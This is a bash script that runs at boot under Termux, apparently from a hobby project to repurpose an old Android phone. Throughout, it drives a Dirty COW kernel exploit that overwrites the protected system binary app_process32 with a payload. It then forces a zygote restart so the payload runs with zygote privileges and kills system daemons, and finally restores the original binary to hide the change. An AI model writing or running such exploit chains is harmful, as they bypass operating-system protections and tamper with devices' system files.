#!/data/data/com.termux/files/usr/bin/bash
# PocketClaw daemon stopper — runs at boot from Termux.
#
# Sequence:
# 1. am hang --allow-restart (while app_process32 is still original)
# 2. Dirty COW app_process32 with payload
# 3. Background restorer watches for zygote PID change
# 4. Watchdog triggers (~60-120s), init restarts zygote
# 5. Payload runs in zygote domain, stops daemons, sleeps 30s
# 6. Restorer detects PID change, Dirty COWs original back (~12s)
# 7. Payload exits, init restarts zygote with clean binary
#
set -e

DIRTYCOW=/data/local/tmp/dirtycow
PAYLOAD=/data/local/tmp/payload
ORIG=/data/local/tmp/app_process32.orig
TARGET=/system/bin/app_process32

# Sanity check
for f in "$DIRTYCOW" "$PAYLOAD" "$ORIG"; do
    [ -f "$f" ] || { echo "MISSING: $f"; exit 1; }
done

# Get current zygote PID
ORIG_PID=$(ps | grep -w zygote | grep -v grep | awk '{print $2}')
[ -n "$ORIG_PID" ] || { echo "Cannot find zygote PID"; exit 1; }
echo "Zygote PID: $ORIG_PID"

# Step 1: Hang system (BEFORE COW — am needs working app_process32)
echo "Triggering am hang --allow-restart..."
am hang --allow-restart &
AM_PID=$!
sleep 2

# Step 2: Dirty COW app_process32 with payload
echo "Dirty COW app_process32..."
$DIRTYCOW "$TARGET" "$PAYLOAD"

# Step 3: Background restorer — watches for zygote PID change
(
    echo "Restorer: watching for PID change from $ORIG_PID..."
    while true; do
        NEW_PID=$(ps | grep -w zygote | grep -v grep | awk '{print $2}')
        if [ -n "$NEW_PID" ] && [ "$NEW_PID" != "$ORIG_PID" ]; then
            echo "Restorer: zygote restarted (was $ORIG_PID, now $NEW_PID)"
            # Wait a moment for payload to start its work
            sleep 3
            echo "Restorer: restoring app_process32..."
            $DIRTYCOW "$TARGET" "$ORIG"
            echo "Restorer: done."
            break
        fi
        sleep 2
    done
) &
RESTORER_PID=$!

# Step 4: Wait for the whole sequence to complete
# Watchdog timeout ~60-120s + payload sleep 30s + restore ~12s
echo "Waiting for watchdog + payload + restore (up to 180s)..."
WAITED=0
while [ $WAITED -lt 180 ]; do
    if ! kill -0 $RESTORER_PID 2>/dev/null; then
        echo "Restorer finished after ${WAITED}s."
        break
    fi
    sleep 5
    WAITED=$((WAITED + 5))
done

# Cleanup
kill $AM_PID 2>/dev/null || true
kill $RESTORER_PID 2>/dev/null || true

# Verify
sleep 5
NEW_PID=$(ps | grep -w zygote | grep -v grep | awk '{print $2}')
echo "Final zygote PID: $NEW_PID"
echo "Checking daemons..."
ps | grep -E 'drmserver|mm-qcamera|audiod' && echo "WARNING: daemons still running" || echo "Daemons stopped OK"
ps | grep rild && echo "(rild still running — expected)" || true
echo "Done."
